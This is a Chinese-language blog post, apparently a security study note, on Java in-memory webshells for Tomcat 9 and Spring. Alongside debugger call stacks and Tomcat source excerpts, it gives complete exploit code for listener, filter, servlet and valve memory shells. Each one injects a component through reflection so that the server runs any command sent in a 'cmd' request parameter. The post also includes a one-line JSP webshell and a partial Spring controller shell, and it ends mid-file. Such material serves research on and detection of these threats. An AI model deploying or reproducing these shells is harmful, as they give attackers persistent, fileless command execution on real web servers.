---
title: Java内存马
toc: true
categories:
  - 技术
  - web
date: 2025-09-20 23:10:12
tags:
  - java
  - web安全

---

本文研究java内存马相关，环境：java 1.8 tomcat 9.0.95

本质跟python的一样还是改了一些对象的属性来实现

先不考虑回显

jsp中简单的一句话木马

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

需要文件落地，类似php

而Java可以动态添加组件来实现内存马

## Tomcat内存马

Servlet 3.0 （tomcat7+）提供了动态注册servlet, listener, filter机制

从request获取StandardContext

方法一

```java
StandardContext standardContext = null;
while (standardContext == null) {
                Field f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                Object object = f.get(servletContext);

                if (object instanceof ServletContext) {
                    servletContext = (ServletContext) object;
                } else if (object instanceof StandardContext) {
                    standardContext = (StandardContext) object;
                }
            }
```

方法二

```java
//获取ApplicationContextFacade
ServletContext servletContext = request.getSession().getServletContext();

//反射获取ApplicationContextFacade类属性context为ApplicationContext
Field appContextField = servletContext.getClass().getDeclaredField("context");
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

//反射获取ApplicationContext类属性context为StandardContext
Field standardContextField = applicationContext.getClass().getDeclaredField("context");
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
```



#### Listener内存马

写一个恶意listener, 在恶意代码处断点调试，查看每次请求是如何执行到恶意代码的

```java
package org.example.demo2.Listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.String;


@WebListener
public class MemoryShell_Listener implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String cmd = request.getParameter("cmd");//断点
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
    }


}
```

调用链：

```
requestInitialized:15, MemoryShell_Listener (org.example.demo2.Listener)
fireRequestInitEvent:5155, StandardContext (org.apache.catalina.core)
invoke:116, StandardHostValve (org.apache.catalina.core)
invoke:93, ErrorReportValve (org.apache.catalina.valves)
invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:346, CoyoteAdapter (org.apache.catalina.connector)
service:383, Http11Processor (org.apache.coyote.http11)
process:63, AbstractProcessorLight (org.apache.coyote)
process:937, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:52, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:750, Thread (java.lang)
```

所以可以看到最后在`StandardContext`的`fireRequestInitEvent`中调用`listener.requestInitialized(event);`来实现, 如果能控制listener，就可以实现执行任意代码了

```java
public boolean fireRequestInitEvent(ServletRequest request) {
        Object[] instances = this.getApplicationEventListeners();
        if (instances != null && instances.length > 0) {
            ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request);

            for(int i = 0; i < instances.length; ++i) {
                if (instances[i] != null && instances[i] instanceof ServletRequestListener) {
                    ServletRequestListener listener = (ServletRequestListener)instances[i];

                    try {
                        listener.requestInitialized(event);
                    } catch (Throwable var8) {
                        ExceptionUtils.handleThrowable(var8);
                        this.getLogger().error(sm.getString("standardContext.requestListener.requestInit", new Object[]{instances[i].getClass().getName()}), var8);
                        request.setAttribute("javax.servlet.error.exception", var8);
                        return false;
                    }
                }
            }
        }
```

`getApplicationEventListeners()`获取数组`applicationEventListenersList`

```
   public Object[] getApplicationEventListeners() {
        return this.applicationEventListenersList.toArray();
    }
```

只要控制`applicationEventListenersList`即可，可反射也可`StandardContext#addApplicationEventListener()`方法来添加Listener

```
public void addApplicationEventListener(Object listener) {
    this.applicationEventListenersList.add(listener);
}
```

StandardContext的实例对象可通过request.getContext()获取

```java
	ServletContext servletContext = req.getServletContext();

	StandardContext standardContext = null;

	try {
		while (standardContext == null) {
			Field f = servletContext.getClass().getDeclaredField("context");
			f.setAccessible(true);
			Object object = f.get(servletContext);

			if (object instanceof ServletContext) {
				servletContext = (ServletContext) object;
			} else if (object instanceof StandardContext) {
				standardContext = (StandardContext) object;
			}
		}catch (Exception e) {
			e.printStackTrace();
		}
```

###### exp:

```java
package org.example.demo2;

import java.io.*;
import java.lang.reflect.Field;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import org.apache.catalina.core.StandardContext;

class MemoryShell_Listener implements ServletRequestListener {

        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }

        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
@WebServlet(name = "helloServlet", value = "/hello-servlet")
public class HelloServlet extends HttpServlet {


    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {

        ServletContext servletContext = req.getServletContext();

        StandardContext standardContext = null;
		MemoryShell_Listener memoryShellListener= new MemoryShell_Listener();
        try {
            while (standardContext == null) {
                Field f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                Object object = f.get(servletContext);

                if (object instanceof ServletContext) {
                    servletContext = (ServletContext) object;
                } else if (object instanceof StandardContext) {
                    standardContext = (StandardContext) object;
                }
            }
            standardContext.addApplicationEventListener(memoryShellListener);
//            Field a=standardContext.getClass().getDeclaredField("applicationEventListenersList");
//            a.setAccessible(true);
//            List<Object> listeners = (List<Object>) a.get(standardContext);
//            listeners.add(memoryShellListener);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
```

#### Filter内存马

写一个恶意filter调试查看filter运行时的调用过程

```java
package org.example.demo2.Filter;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/*")
public class MemoryShell_Filter implements Filter {
    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException{
     String cmd = req.getParameter("cmd");//断点
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        chain.doFilter(req, resp);
    }

}
```

调用链

```
doFilter:11, MemoryShell_Filter (org.example.demo2.Filter)
internalDoFilter:168, ApplicationFilterChain (org.apache.catalina.core)
doFilter:144, ApplicationFilterChain (org.apache.catalina.core)
invoke:168, StandardWrapperValve (org.apache.catalina.core)
invoke:90, StandardContextValve (org.apache.catalina.core)
invoke:482, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:130, StandardHostValve (org.apache.catalina.core)
invoke:93, ErrorReportValve (org.apache.catalina.valves)
invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:346, CoyoteAdapter (org.apache.catalina.connector)
service:383, Http11Processor (org.apache.coyote.http11)
process:63, AbstractProcessorLight (org.apache.coyote)
process:937, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:52, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:750, Thread (java.lang)
```

ApplicationFilterChain#internalDoFilter

```java
private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {
    if (this.pos < this.n) {
        ApplicationFilterConfig filterConfig = this.filters[this.pos++];

        try {
            Filter filter = filterConfig.getFilter();
            if (request.isAsyncSupported() && !filterConfig.getFilterDef().getAsyncSupportedBoolean()) {
                request.setAttribute("org.apache.catalina.ASYNC_SUPPORTED", Boolean.FALSE);
            }

            if (Globals.IS_SECURITY_ENABLED) {
                Principal principal = ((HttpServletRequest)request).getUserPrincipal();
                Object[] args = new Object[]{request, response, this};
                SecurityUtil.doAsPrivilege("doFilter", filter, classType, args, principal);
            } else {
                filter.doFilter(request, response, this);//这里调用了我们的filter
            }

        } catch (ServletException | RuntimeException | IOException var15) {
            throw var15;
        } catch (Throwable var16) {
            Throwable e = ExceptionUtils.unwrapInvocationTargetException(var16);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString("filterChain.filter"), e);
        }
    } else {
        try {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set(request);
                lastServicedResponse.set(response);
            }

            if (request.isAsyncSupported() && !this.servletSupportsAsync) {
                request.setAttribute("org.apache.catalina.ASYNC_SUPPORTED", Boolean.FALSE);
            }

            if (request instanceof HttpServletRequest && response instanceof HttpServletResponse && Globals.IS_SECURITY_ENABLED) {
                Principal principal = ((HttpServletRequest)request).getUserPrincipal();
                Object[] args = new Object[]{request, response};
                SecurityUtil.doAsPrivilege("service", this.servlet, classTypeUsedInService, args, principal);
            } else {
                this.servlet.service(request, response);
            }
        } catch (ServletException | RuntimeException | IOException var17) {
            throw var17;
        } catch (Throwable var18) {
            Throwable e = ExceptionUtils.unwrapInvocationTargetException(var18);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString("filterChain.servlet"), e);
        } finally {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set((Object)null);
                lastServicedResponse.set((Object)null);
            }

        }

    }
}
```

能控制这个函数中变量filter是关键

而filter = filterConfig.getFilter();没找到能直接改的地方

向上面的调用链中`invoke:168, StandardWrapperValve (org.apache.catalina.core)`

```java
public void invoke(Request request, Response response) throws IOException, ServletException {
    boolean unavailable = false;
    Throwable throwable = null;
    long t1 = System.currentTimeMillis();
    this.requestCount.incrementAndGet();
    StandardWrapper wrapper = (StandardWrapper)this.getContainer();
    Servlet servlet = null;
    Context context = (Context)wrapper.getParent();
    if (!context.getState().isAvailable()) {
        response.sendError(503, sm.getString("standardContext.isUnavailable"));
        unavailable = true;
    }

    if (!unavailable && wrapper.isUnavailable()) {
        this.container.getLogger().info(sm.getString("standardWrapper.isUnavailable", new Object[]{wrapper.getName()}));
        this.checkWrapperAvailable(response, wrapper);
        unavailable = true;
    }

    try {
        if (!unavailable) {
            servlet = wrapper.allocate();
        }
    } catch (UnavailableException var79) {
        this.container.getLogger().error(sm.getString("standardWrapper.allocateException", new Object[]{wrapper.getName()}), var79);
        this.checkWrapperAvailable(response, wrapper);
    } catch (ServletException var80) {
        this.container.getLogger().error(sm.getString("standardWrapper.allocateException", new Object[]{wrapper.getName()}), StandardWrapper.getRootCause(var80));
        throwable = var80;
        this.exception(request, response, var80);
    } catch (Throwable var81) {
        ExceptionUtils.handleThrowable(var81);
        this.container.getLogger().error(sm.getString("standardWrapper.allocateException", new Object[]{wrapper.getName()}), var81);
        throwable = var81;
        this.exception(request, response, var81);
    }

    MessageBytes requestPathMB = request.getRequestPathMB();
    DispatcherType dispatcherType = DispatcherType.REQUEST;
    if (request.getDispatcherType() == DispatcherType.ASYNC) {
        dispatcherType = DispatcherType.ASYNC;
    }

    request.setAttribute("org.apache.catalina.core.DISPATCHER_TYPE", dispatcherType);
    request.setAttribute("org.apache.catalina.core.DISPATCHER_REQUEST_PATH", requestPathMB);
    ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);//filterChain赋值
    Container container = this.container;
    boolean var50 = false;

    long t2;
    long time;
    label1219: {
        label1220: {
            label1221: {
                label1222: {
                    label1223: {
                        label1224: {
                            try {
                                var50 = true;
                                if (servlet != null) {
                                    if (filterChain != null) {
                                        if (context.getSwallowOutput()) {
                                            boolean var78 = false;

                                            try {
                                                var78 = true;
                                                SystemLogHandler.startCapture();
                                                if (request.isAsyncDispatching()) {
                                                    request.getAsyncContextInternal().doInternalDispatch();
                                                    var78 = false;
                                                } else {
                                                    filterChain.doFilter(request.getRequest(), response.getResponse());
                                                    var78 = false;
                                                }
                                            } finally {
                                                if (var78) {
                                                    String log = SystemLogHandler.stopCapture();
                                                    if (log != null && !log.isEmpty()) {
                                                        context.getLogger().info(log);
                                                    }

                                                }
                                            }

                                            String log = SystemLogHandler.stopCapture();
                                            if (log != null) {
                                                if (!log.isEmpty()) {
                                                    context.getLogger().info(log);
                                                    var50 = false;
                                                } else {
                                                    var50 = false;
                                                }
                                            } else {
                                                var50 = false;
                                            }
                                        } else if (request.isAsyncDispatching()) {
                                            request.getAsyncContextInternal().doInternalDispatch();
                                            var50 = false;
                                        } else {
                                            filterChain.doFilter(request.getRequest(), response.getResponse());//调用点
                                            var50 = false;
                                        }
```

ApplicationFilterFactory.createFilterChain中有StandardContext

```java
public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) {
    if (servlet == null) {
        return null;
    } else {
        ApplicationFilterChain filterChain;
        if (request instanceof Request) {
            Request req = (Request)request;
            if (Globals.IS_SECURITY_ENABLED) {
                filterChain = new ApplicationFilterChain();
            } else {
                filterChain = (ApplicationFilterChain)req.getFilterChain();
                if (filterChain == null) {
                    filterChain = new ApplicationFilterChain();
                    req.setFilterChain(filterChain);
                }
            }
        } else {
            filterChain = new ApplicationFilterChain();
        }

        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
        StandardContext context = (StandardContext)wrapper.getParent();
        FilterMap[] filterMaps = context.findFilterMaps();
        if (filterMaps != null && filterMaps.length != 0) {
            DispatcherType dispatcher = (DispatcherType)request.getAttribute("org.apache.catalina.core.DISPATCHER_TYPE");
            String requestPath = FilterUtil.getRequestPath(request);
            String servletName = wrapper.getName();
            FilterMap[] var9 = filterMaps;
            int var10 = filterMaps.length;

            int var11;
            FilterMap filterMap;
            ApplicationFilterConfig filterConfig;
            for(var11 = 0; var11 < var10; ++var11) {
                filterMap = var9[var11];
                if (matchDispatcher(filterMap, dispatcher) && FilterUtil.matchFiltersURL(filterMap, requestPath)) {
                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                    if (filterConfig == null) {
                        log.warn(sm.getString("applicationFilterFactory.noFilterConfig", new Object[]{filterMap.getFilterName()}));
                    } else {
                        filterChain.addFilter(filterConfig);
                    }
                }
            }

            var9 = filterMaps;
            var10 = filterMaps.length;

            for(var11 = 0; var11 < var10; ++var11) {
                filterMap = var9[var11];
                if (matchDispatcher(filterMap, dispatcher) && matchFiltersServlet(filterMap, servletName)) {
                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                    if (filterConfig == null) {
                        log.warn(sm.getString("applicationFilterFactory.noFilterConfig", new Object[]{filterMap.getFilterName()}));
                    } else {
                        filterChain.addFilter(filterConfig);
                    }
                }
            }

            return filterChain;
        } else {
            return filterChain;
        }
    }
}
```

可以通过修改StandardContext属性来修改filterChain，可以发现listener内存马也是修改StandardContext属性的

StandardContext.class中

```
private final Map<String, ApplicationFilterConfig> filterConfigs = new HashMap();
private final Map<String, FilterDef> filterDefs = new HashMap();
private final ContextFilterMaps filterMaps = new ContextFilterMaps();

public FilterMap[] findFilterMaps() {
        return this.filterMaps.asArray();
}

public FilterConfig findFilterConfig(String name) {
    synchronized(this.filterDefs) {
        return (FilterConfig)this.filterConfigs.get(name);
    }
}
```

所以需要filterMaps与filterConfigs

###### exp: 

```java
package org.example.demo2;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.List;
import java.util.Map;
import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

class MemoryShell_Filter implements Filter {
    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException{
     String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        chain.doFilter(req, resp);
    }

}
@WebServlet(name = "helloServlet", value = "/hello-servlet")
public class HelloServlet extends HttpServlet {


    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {

        ServletContext servletContext = req.getServletContext();
        StandardContext standardContext=null;
        //获取StandardContext
        try {
            Field a = servletContext.getClass().getDeclaredField("context");
            a.setAccessible(true);
            ServletContext applicationContext = (ServletContext)a.get(servletContext);
            Field b = applicationContext.getClass().getDeclaredField("context");
            b.setAccessible(true);
            standardContext = (StandardContext) b.get(applicationContext);
        }catch (NoSuchFieldException e){
            e.printStackTrace();
        }catch (IllegalAccessException e){
            e.printStackTrace();
        }
        MemoryShell_Filter filter= new MemoryShell_Filter();
        //filterDef
        String name = "Filter";
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        standardContext.addFilterDef(filterDef);
		//filterMap
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        standardContext.addFilterMapBefore(filterMap);
		//filterConfigs
        Field Configs = null;
        try {
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
            filterConfigs.put(name, filterConfig);
        } catch (NoSuchFieldException | NoSuchMethodException | InstantiationException | IllegalAccessException |
                 InvocationTargetException e) {
            throw new RuntimeException(e);
        }

    }
}
```

#### servlet内存马

listener与filter是运行的时候在字典里查找类来进行的

而servlet是容器初始化时加入字典的，然后加载（加载后才到内存里）

而且在这里调试并没有找到可以控制wrapper的，我们想办法在运行时增加wrapper，然后加载（重要)

tomcat通过`StandardContext`类的`startInternal()`方法来初始化容器

最终在`configureContext(webXml)`方法中创建StandWrapper对象，通过`addServletMappingDecoded()`方法添加Servlet对应的url映射

###### exp:

```java
package org.example.demo2;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.List;
import java.util.Map;
import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

import org.apache.catalina.Context;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

class MemoryShell_Servlet extends HttpServlet {

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String cmd = request.getParameter("cmd");
        Runtime.getRuntime().exec(cmd);
    }

}
@WebServlet(name = "helloServlet", value = "/hello-servlet")
public class HelloServlet extends HttpServlet {
    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {

        ServletContext servletContext = req.getServletContext();
        StandardContext standardContext=null;
        //获取StandardContext
        try {
            Field a = servletContext.getClass().getDeclaredField("context");
            a.setAccessible(true);
            ServletContext applicationContext = (ServletContext)a.get(servletContext);
            Field b = applicationContext.getClass().getDeclaredField("context");
            b.setAccessible(true);
            standardContext = (StandardContext) b.get(applicationContext);
        }catch (NoSuchFieldException e){
            e.printStackTrace();
        }catch (IllegalAccessException e){
            e.printStackTrace();
        }

        MemoryShell_Servlet shell_servlet= new MemoryShell_Servlet();


    	String name = shell_servlet.getClass().getSimpleName();

    	Wrapper wrapper = standardContext.createWrapper();
        wrapper.setLoadOnStartup(1);
        wrapper.setName(name);
        wrapper.setServlet(shell_servlet);
        wrapper.setServletClass(shell_servlet.getClass().getName());



        standardContext.addChild(wrapper);
        standardContext.addServletMappingDecoded("/shell",name);

    }

}
```

#### value内存马

tomcat管道Pipeline就是连接不同的wrapper或者context的类

而value就是在一个管道中的一些阀门

![20220218104446](D:\download\20220218104446.png)

value内存马可以在context的管道中加，也可以在wrapper的加，engine与host也可以，这里介绍context的与wrapper的

先在恶意servlet打断点查看value的invoke调用顺序



```
<init>:10, MemoryShell_Servlet (org.example.demo2.Servlet)
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:423, Constructor (java.lang.reflect)
newInstance:143, DefaultInstanceManager (org.apache.catalina.core)
loadServlet:898, StandardWrapper (org.apache.catalina.core)
allocate:659, StandardWrapper (org.apache.catalina.core)
invoke:116, StandardWrapperValve (org.apache.catalina.core)
invoke:90, StandardContextValve (org.apache.catalina.core)
invoke:482, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:130, StandardHostValve (org.apache.catalina.core)
invoke:93, ErrorReportValve (org.apache.catalina.valves)
invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:346, CoyoteAdapter (org.apache.catalina.connector)
service:383, Http11Processor (org.apache.coyote.http11)
process:63, AbstractProcessorLight (org.apache.coyote)
process:937, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:52, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:750, Thread (java.lang)
```

从service:346, CoyoteAdapter (org.apache.catalina.connector)这里

```java
this.connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);
```

来调用invoke:74, StandardEngineValve (org.apache.catalina.core)，然后实现调用后续的Valve

##### context的管道

###### exp:

```java
package org.example.demo2;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.List;
import java.util.Map;
import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

import org.apache.catalina.Context;
import org.apache.catalina.Pipeline;
import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

class Shell_Valve extends ValveBase {
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
    }
@WebServlet(name = "helloServlet", value = "/hello-servlet")
public class HelloServlet extends HttpServlet {
    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {


        ServletContext servletContext = req.getServletContext();
        StandardContext standardContext=null;
        //获取StandardContext
        try {
            Field a = servletContext.getClass().getDeclaredField("context");
            a.setAccessible(true);
            ServletContext applicationContext = (ServletContext)a.get(servletContext);
            Field b = applicationContext.getClass().getDeclaredField("context");
            b.setAccessible(true);
            standardContext = (StandardContext) b.get(applicationContext);
        }catch (NoSuchFieldException e){
            e.printStackTrace();
        }catch (IllegalAccessException e){
            e.printStackTrace();
        }

        Pipeline pipeline = standardContext.getPipeline();
        Shell_Valve shell_valve = new Shell_Valve();
        pipeline.addValve(shell_valve);


    }

}
```

##### wrapper的管道

###### exp:

```java
package org.example.demo2;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.List;
import java.util.Map;
import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

import org.apache.catalina.Context;
import org.apache.catalina.Pipeline;
import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

class Shell_Valve extends ValveBase {
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
    }
@WebServlet(name = "helloServlet", value = "/hello-servlet")
public class HelloServlet extends HttpServlet {
    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {


        ServletContext servletContext = req.getServletContext();
        StandardContext standardContext=null;
        //获取StandardContext
        try {
            Field a = servletContext.getClass().getDeclaredField("context");
            a.setAccessible(true);
            ServletContext applicationContext = (ServletContext)a.get(servletContext);
            Field b = applicationContext.getClass().getDeclaredField("context");
            b.setAccessible(true);
            standardContext = (StandardContext) b.get(applicationContext);
        }catch (NoSuchFieldException e){
            e.printStackTrace();
        }catch (IllegalAccessException e){
            e.printStackTrace();
        }

        Wrapper wrapper = (Wrapper) standardContext.findChild("helloServlet");//已经拥有的servlet
        Pipeline pipeline = wrapper.getPipeline();
        Shell_Valve shell_valve = new Shell_Valve();
        pipeline.addValve(shell_valve);


    }

}
```

## Spring内存马

#### 获取Child WebApplicationContext

##### **RequestContextUtils**

```
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

*通过* `ServletRequest` *类的实例来获得* `Child WebApplicationContext`。

##### **getAttribute**

```

WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

所有的Context在创建后，都会被作为一个属性添加到了ServletContext中，所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext

#### Controller内存马

registerMapping(spring4以后才有)

```
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
// 3. 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition("/shell");
// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. 在内存中动态注册 controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName("恶意Controller").newInstance(), method);
```

而这个函数中

```
private final AbstractHandlerMethodMapping<T>.MappingRegistry mappingRegistry = new MappingRegistry();

public void registerMapping(T mapping, Object handler, Method method) {
    this.mappingRegistry.register(mapping, handler, method);
}

public void register(T mapping, Object handler, Method method) 
```

所以可通过反射调用MappingRegistry#register来添加

```java
//获取当前上下文环境
        WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
        //WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        // 通过 context 获取 RequestMappingHandlerMapping 对象
		RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);

		// 获取父类的 MappingRegistry 属性
		Field f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
		f.setAccessible(true);
		Object mappingRegistry = f.get(mapping);

		// 反射调用 MappingRegistry 的 register 方法
		Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");

		Method[] ms = c.getDeclaredMethods();

//		// 判断当前路径是否已经添加
//		Field field = c.getDeclaredField("urlLookup");
//		field.setAccessible(true);
//
//		Map<String, Object> urlLookup = (Map<String, Object>) field.get(mappingRegistry);
//		for (String urlPath : urlLookup.keySet()) {
//			if ("/shell".equals(urlPath)) {
//				System.out.println("controller url path exist already");
//				return;
//			}
//		}

		// 初始化一些注册需要的信息
		PatternsRequestCondition       url       = new PatternsRequestCondition("/shell");
		RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
		RequestMappingInfo             info      = new RequestMappingInfo(url, condition, null, null, null, null, null);

		Shell sh = new Shell();

		for (Method method : ms) {
			if ("register".equals(method.getName())) {
				// 反射调用 MappingRegistry 的 register 方法注册 TestController 的 index
				method.setAccessible(true);
				method.invoke(mappingRegistry, info, sh, Shell.class.getMethod("shell"));
			}
		}
```

###### exp：

```java
package com.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
